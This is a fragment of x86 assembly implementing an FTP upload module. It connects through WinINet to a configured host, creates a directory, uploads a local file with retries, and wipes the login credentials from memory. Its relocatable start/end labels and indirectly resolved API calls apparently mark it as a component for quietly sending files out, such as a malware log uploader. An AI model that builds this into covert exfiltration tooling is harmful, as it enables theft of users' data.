ftp_send_start:

INIT_INET proc
  LOCAL PASSIVE_FLAG :DWORD
     movzx   eax, byte ptr [P_MODE]
     .if     ( eax == 1 )
             mov      dword ptr [PASSIVE_FLAG], INTERNET_FLAG_PASSIVE
     .else
             mov      dword ptr [PASSIVE_FLAG], 0
     .endif
     
     xor     eax, eax
     push    eax
     push    eax
     push    eax
     push    eax
     push    offset FTP
     call    dword ptr [_InternetOpen]
     
     mov     hInet, eax
     .if      ( eax == 0 )
             jmp      ERRORZ
     .endif
     
     push    255
     push    dword ptr [PASSIVE_FLAG]
     push    INTERNET_SERVICE_FTP
     push    offset FTP_PWD
     push    offset FTP_LOGIN
     push    21
     push    offset FTP_HOST
     push    dword ptr [hInet]
     call    dword ptr [_InternetConnect]
     mov     hFtp, eax
     .if     ( eax == 0 )
             push    dword ptr [hInet]
             call    _InternetCloseHandle
             jmp     ERRORZ
     .endif
     
     push    dword ptr [hFtpDirNameCreate]
     push    dword ptr [hFtp]
     call    dword ptr [_FtpCreateDirectory]
     push    dword ptr [hFtpDirNameCreate]
     push    dword ptr [hFtp]
     call    dword ptr [_FtpSetCurrentDirectory]
     
     RtlZeroMemory, addr FTP_LOGIN, sizeof FTP_LOGIN
     RtlZeroMemory, addr FTP_PWD, sizeof FTP_PWD
     
     ret
INIT_INET endp

FTP_SEND proc uses ecx
     mov     ecx, 5
retry:
     push    ecx
     push    offset cpyto
     call    _PathFindFileName
     push    255
     push    FTP_TRANSFER_TYPE_BINARY
     push    eax
     push    offset cpyfrom
     push    dword ptr [hFtp]
     call    dword ptr [_FtpPutFile]
     pop     ecx
     test    eax, eax
     jne     sent
     dec     ecx
     jnz     retry
sent:
     ret
FTP_SEND endp 

DEINIT_INET proc
     push    dword ptr [hFtp]
     call    dword ptr [_InternetCloseHandle]
     push    dword ptr [hInet]
     call    dword ptr [_InternetCloseHandle]
     ret
DEINIT_INET endp

ftp_send_end: